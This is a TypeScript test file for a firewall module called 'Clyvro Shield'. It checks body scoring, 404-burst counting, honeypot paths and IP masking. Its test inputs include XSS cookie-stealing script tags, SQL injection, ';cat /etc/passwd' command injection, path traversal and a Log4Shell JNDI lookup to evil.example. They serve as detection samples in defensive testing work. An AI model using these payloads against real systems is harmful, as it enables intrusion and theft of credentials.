/**
 * Clyvro Shield — request-body scoring and 404-burst counting.
 *
 * The point of these tests is the *false positive* side as much as the
 * detection side: a sign-up form must never be refused because somebody's
 * company is called "Select From & Co" or their notes quote a URL.
 */
import { describe, expect, it } from "vitest";

import { inspectBody } from "@/lib/shield/body";
import { MISS_BURST_LIMIT, noteMiss } from "@/lib/shield/misses";
import { inspectRequest, maskIp } from "@/lib/shield/rules";

const registration = (overrides: Record<string, unknown> = {}) => ({
  name: "Adaeze O'Brien-Chukwu",
  email: "adaeze@studio.example",
  password: "correct horse battery staple",
  organizationName: "Studio Adaeze",
  notes: "We audit sites like https://shop.example/search?q=select+from+catalogue&sort=desc",
  ...overrides,
});

describe("inspectBody — ordinary payloads", () => {
  it("allows a normal registration", () => {
    const result = inspectBody(registration({ notes: "We run a small design studio in Lagos." }));
    expect(result.verdict).toBe("allow");
    expect(result.score).toBe(0);
  });

  it("is only suspicious about prose that quotes a payload (no false 403 in Enforce mode)", () => {
    const quoting = inspectBody(registration());
    expect(quoting.verdict).toBe("suspicious");
    expect(quoting.score).toBeLessThan(3);
  });

  it("never scores passwords: an opaque field may look like anything", () => {
    const result = inspectBody(registration({ notes: "", password: ";cat /etc/passwd 1 UNION SELECT null" }));
    expect(result.verdict).toBe("allow");
  });

  it("ignores empty and non-string bodies", () => {
    expect(inspectBody(null).verdict).toBe("allow");
    expect(inspectBody([]).verdict).toBe("allow");
    expect(inspectBody({ name: "", count: 3, flag: true }).verdict).toBe("allow");
  });

  it("treats URL-bearing fields leniently (Clyvro handles foreign URLs)", () => {
    const result = inspectBody({ url: "https://example.com/?q=<script>alert(1)</script>" });
    expect(result.verdict).toBe("suspicious");
    expect(result.score).toBeLessThan(3);
  });

  it("does not add weak hints across unrelated fields into a block", () => {
    const result = inspectBody({ a: "concat(", b: "ascii(", c: "0xdeadbeefdeadbeef" });
    expect(result.verdict).not.toBe("block");
  });
});

describe("inspectBody — attacks inside the JSON", () => {
  it("blocks a script tag in a name field", () => {
    const result = inspectBody(registration({ name: "<script>alert(document.cookie)</script>" }));
    expect(result.verdict).toBe("block");
    expect(result.field).toBe("name");
    expect(result.matches.some((m) => m.family === "xss")).toBe(true);
  });

  it("blocks SQL injection in a nested field and reports the path, not the value", () => {
    const result = inspectBody({ form: { organizationName: "1' OR '1'='1' --" } });
    expect(result.verdict).toBe("block");
    expect(result.field).toBe("form.organizationName");
    expect(JSON.stringify(result)).not.toContain("1' OR '1'='1'");
  });

  it("blocks command injection and Log4Shell lookups", () => {
    expect(inspectBody({ organizationName: ";cat /etc/passwd" }).verdict).toBe("block");
    expect(inspectBody({ organizationName: "${jndi:ldap://evil.example/a}" }).verdict).toBe("block");
    // Two independent signatures in prose still add up.
    expect(inspectBody({ message: ";cat /etc/passwd ${jndi:ldap://evil.example/a}" }).verdict).toBe("block");
  });

  it("scores inside arrays", () => {
    const result = inspectBody({ tags: ["ok", "../../../../etc/passwd"] });
    expect(result.verdict).toBe("block");
    expect(result.field).toBe("tags[1]");
  });

  it("stays bounded on a hostile payload", () => {
    const huge = Object.fromEntries(Array.from({ length: 500 }, (_, i) => [`f${i}`, "x".repeat(5_000)]));
    const started = Date.now();
    const result = inspectBody(huge);
    expect(Date.now() - started).toBeLessThan(500);
    expect(result.verdict).toBe("allow");
  });
});

describe("404-burst counting", () => {
  it("stays quiet for a person with a stale bookmark", () => {
    const ip = `hash-${Math.random()}`;
    for (let i = 0; i < MISS_BURST_LIMIT; i += 1) expect(noteMiss(ip, 1_000 + i)).toBe("ok");
  });

  it("reports once per minute once a burst crosses the line", () => {
    const ip = `hash-${Math.random()}`;
    const base = 10_000;
    for (let i = 0; i < MISS_BURST_LIMIT; i += 1) noteMiss(ip, base + i);
    expect(noteMiss(ip, base + 100)).toBe("reported");
    expect(noteMiss(ip, base + 200)).toBe("burst");
    // A full quiet minute starts over, like a person with another stale link.
    expect(noteMiss(ip, base + 70_000)).toBe("ok");
  });

  it("keeps addresses independent", () => {
    const a = `a-${Math.random()}`;
    const b = `b-${Math.random()}`;
    for (let i = 0; i < MISS_BURST_LIMIT; i += 1) noteMiss(a, 20_000 + i);
    expect(noteMiss(b, 20_100)).toBe("ok");
  });
});

describe("trailing-slash honeypot paths are recognisable", () => {
  // Vercel answers a 308 for `/phpmyadmin/` before the middleware runs, which
  // is why the live probe tests both spellings. When the request does reach
  // Shield, the rule must fire.
  it("flags /phpmyadmin/ itself", () => {
    const inspection = inspectRequest({ method: "GET", pathname: "/phpmyadmin/", search: "", userAgent: "Mozilla/5.0" });
    expect(inspection.verdict).toBe("block");
    expect(inspection.primary).toBe("honeypot");
  });
});

describe("maskIp — header-safe masking", () => {
  // Regression: an IPv6 address used to be masked with a typographic ellipsis,
  // which is not a valid HTTP header value, so the block page threw a 500.
  it("is ASCII for IPv4, IPv6, mapped IPv4 and unknown addresses", () => {
    const inputs = ["102.89.44.7", "::1", "::ffff:127.0.0.1", "2001:db8:85a3::8a2e:370:7334", "unknown", "not-an-ip"];
    for (const ip of inputs) {
      const masked = maskIp(ip);
      expect(masked).toMatch(/^[\x20-\x7E]*$/);
      if (ip !== "unknown") expect(masked).not.toBe(ip);
    }
  });
});
